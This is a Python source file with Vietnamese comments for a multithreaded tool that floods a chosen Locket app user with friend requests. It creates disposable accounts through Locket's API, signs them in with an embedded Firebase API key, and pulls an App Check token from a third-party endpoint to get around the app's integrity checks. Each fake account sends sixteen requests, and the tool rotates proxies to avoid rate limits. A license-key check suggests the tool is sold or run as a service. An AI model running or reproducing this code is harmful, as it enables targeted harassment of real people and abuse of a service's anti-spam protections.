# spammer.py (phiên bản 2.0 - Tích hợp Logic Chuyên sâu)
import requests
import re
import random
import string
import threading
import time
import queue
from typing import Optional, Callable
from keygen import validate_key as validate_license_from_file

# Lớp Spammer mới, thực hiện toàn bộ chuỗi logic spam
class Spammer:
    def __init__(self, proxy: str, target_uid: str, custom_name: str):
        # Hằng số và URL từ tool gốc
        self.API_LOCKET_URL = "https://api.locketcamera.com"
        self.FIREBASE_AUTH_URL = "https://www.googleapis.com/identitytoolkit/v3/relyingparty"
        self.FIREBASE_API_KEY = "AIzaSyCQngaaXQIfJaH0aS2l7REgIjD7nL431So"
        self.REQUEST_TIMEOUT = 15

        self.proxy_str = proxy
        self.proxies_dict = self._format_proxy(proxy)
        self.target_uid = target_uid
        self.custom_name = custom_name
        self.session = requests.Session()
        self.session.proxies = self.proxies_dict
        
        # Biến trạng thái
        self.firebase_app_check = SpamManager.FIREBASE_APP_CHECK_TOKEN # Lấy token tĩnh
        self.id_token = None
        self.local_id = None
        
    def _format_proxy(self, proxy_str):
        if not proxy_str: return None
        if not proxy_str.startswith(('http://', 'https://')):
            proxy_str = f"http://{proxy_str}"
        return {"http": proxy_str, "https": proxy_str}

    def _rand_str(self, length=10, chars=string.ascii_lowercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(length))

    # --- Các bước trong chuỗi spam ---
    
    def _create_account(self):
        email = f"{self._rand_str(15)}@thanhdieu.com"
        password = 'zlocket' + self._rand_str(7)
        payload = {
            "data": {
                "email": email, "password": password,
                "client_email_verif": True, "platform": "ios"
            }
        }
        headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.firebase_app_check}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/createAccountWithEmailPassword", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200:
                return email, password # Thành công
            return None, None
        except:
            return None, None
            
    def _sign_in(self, email, password):
        payload = {"email": email, "password": password, "returnSecureToken": True}
        headers = {'Content-Type': 'application/json', 'X-Firebase-AppCheck': self.firebase_app_check}
        try:
            res = self.session.post(f"{self.FIREBASE_AUTH_URL}/verifyPassword?key={self.FIREBASE_API_KEY}", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            if res.status_code == 200 and 'idToken' in res.json():
                self.id_token = res.json()['idToken']
                self.local_id = res.json()['localId']
                return True
            return False
        except:
            return False
            
    def _finalize_user(self):
        payload = {
            "data": {
                "username": self._rand_str(8, chars=string.ascii_lowercase),
                "last_name": "✨",
                "first_name": self.custom_name[:20] # Giới hạn 20 ký tự
            }
        }
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/finalizeTemporaryUser", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except:
            return False

    def _send_friend_request(self):
        payload = {"data": {"user_uid": self.target_uid, "source": "signUp"}}
        headers = {'Content-Type': 'application/json', 'Authorization': f'Bearer {self.id_token}'}
        try:
            res = self.session.post(f"{self.API_LOCKET_URL}/sendFriendRequest", headers=headers, json=payload, timeout=self.REQUEST_TIMEOUT)
            return res.status_code == 200
        except:
            return False
            
    def run_cycle(self):
        """Thực hiện toàn bộ chu trình spam cho 1 tài khoản"""
        if not self.firebase_app_check:
            return "failed", 0 # Lỗi thiếu token
            
        email, password = self._create_account()
        if not email:
            return "failed", 0
        
        if not self._sign_in(email, password):
            return "failed", 0

        if not self._finalize_user():
            return "failed", 0

        # Gửi request và boost
        sent_count = 0
        for i in range(16): # 1 request đầu + 15 boost
            if self._send_friend_request():
                sent_count += 1
            if i == 0 and sent_count == 0:
                # Nếu request đầu tiên đã thất bại, không cần boost nữa
                return "failed", 0
                
        return "success", sent_count


# Trình quản lý chính, điều phối các phiên và luồng
class SpamManager:
    FIREBASE_APP_CHECK_TOKEN = None # Token chung cho tất cả các luồng

    def __init__(self):
        self.TOKEN_API_URL = "https://thanhdieu.com/api/v1/locket/token"
        self.active_spam_sessions = {}
        self.proxy_queue = queue.Queue()
        SpamManager.FIREBASE_APP_CHECK_TOKEN = self._fetch_app_check_token()
        if not SpamManager.FIREBASE_APP_CHECK_TOKEN:
            print("[CRITICAL] Không thể lấy App Check Token. Chức năng spam sẽ không hoạt động.")

    def _fetch_app_check_token(self):
        try:
            res = requests.get(self.TOKEN_API_URL, timeout=15)
            return res.json().get("data", {}).get("token") if res.status_code == 200 else None
        except:
            print("[ERROR] Lỗi khi kết nối đến API lấy token.")
            return None
    
    def _load_proxies(self):
        try:
            with open('proxy.txt', 'r') as f:
                proxies = [line.strip() for line in f if line.strip()]
                random.shuffle(proxies)
                for p in proxies:
                    self.proxy_queue.put(p)
            print(f"[INFO] Đã tải và xếp ngẫu nhiên {len(proxies)} proxies.")
            return len(proxies)
        except FileNotFoundError:
            print("[CRITICAL] File proxy.txt không tồn tại! Vui lòng tạo file và thêm proxy.")
            return 0
        
    def find_locket_uid(self, user_input: str) -> Optional[str]:
        user_input = user_input.strip()
        url_to_check = f"https://locket.cam/{user_input}" if not re.match(r'^https?://', user_input) else user_input
        try:
            response = requests.get(url_to_check, timeout=15, allow_redirects=True)
            response.raise_for_status()
            final_url = response.url
            
            match = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', final_url)
            if match:
                return match.group(1)
            
            js_redirect_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', response.text)
            if js_redirect_match:
                redirected_url = js_redirect_match.group(1)
                match_js = re.search(r'locket\.camera/invites/([a-zA-Z0-9]{28})', redirected_url)
                if match_js:
                    return match_js.group(1)

            return None
        except requests.RequestException:
            return None
            
    def validate_license(self, key: str) -> dict:
        return validate_license_from_file(key)
        
    def start_spam_session(self, user_id: int, target: str, custom_name: str, num_threads: int, update_callback: Callable):
        if user_id in self.active_spam_sessions:
            update_callback(status="error", message="Bạn đã có một phiên spam đang chạy.")
            return
            
        target_uid = self.find_locket_uid(target)
        if not target_uid:
            update_callback(status="error", message=f"Không thể tìm thấy Locket UID từ `{target}`.")
            return

        if self.proxy_queue.empty():
            if self._load_proxies() == 0:
                update_callback(status="error", message="Không có proxy nào để chạy. Vui lòng thêm vào `proxy.txt`.")
                return

        stop_event = threading.Event()
        self.active_spam_sessions[user_id] = stop_event
        stats = {'accounts': 0, 'requests': 0, 'failed': 0, 'start_time': time.time()}

        def spam_loop():
            worker_threads = []
            for i in range(num_threads):
                thread = threading.Thread(target=self._run_worker, args=(target_uid, custom_name, stop_event, stats))
                worker_threads.append(thread)
                thread.start()

            last_update = time.time()
            while not stop_event.is_set():
                if time.time() - last_update > 2:  # Cập nhật mỗi 2 giây
                    update_callback(status="running", stats=stats)
                    last_update = time.time()
                
                # Kiểm tra nếu tất cả luồng đã chết (ví dụ hết proxy)
                if not any(t.is_alive() for t in worker_threads):
                    break
                
                time.sleep(0.5)

            # Đợi các luồng kết thúc hẳn
            for t in worker_threads:
                t.join()

            update_callback(status="stopped", stats=stats)
            if user_id in self.active_spam_sessions:
                del self.active_spam_sessions[user_id]

        session_thread = threading.Thread(target=spam_loop)
        session_thread.daemon = True
        session_thread.start()
        update_callback(status="started", message=f"✅ Đã bắt đầu spam đến `{target_uid}` với **{num_threads}** luồng.")
        
    def _run_worker(self, target_uid, custom_name, stop_event, stats):
        """Luồng công nhân, liên tục lấy proxy và chạy chu trình spam."""
        while not stop_event.is_set():
            try:
                proxy = self.proxy_queue.get(timeout=1)
            except queue.Empty:
                # Hết proxy
                break
            
            spammer_instance = Spammer(proxy, target_uid, custom_name)
            status, sent_count = spammer_instance.run_cycle()

            with threading.Lock():
                if status == "success":
                    stats['accounts'] += 1
                    stats['requests'] += sent_count
                else:
                    stats['failed'] += 1
            
            # Trả proxy lại vào hàng đợi để tái sử dụng
            self.proxy_queue.put(proxy)

    def stop_spam_session(self, user_id: int) -> bool:
        if user_id in self.active_spam_sessions:
            self.active_spam_sessions[user_id].set()
            return True
        return False
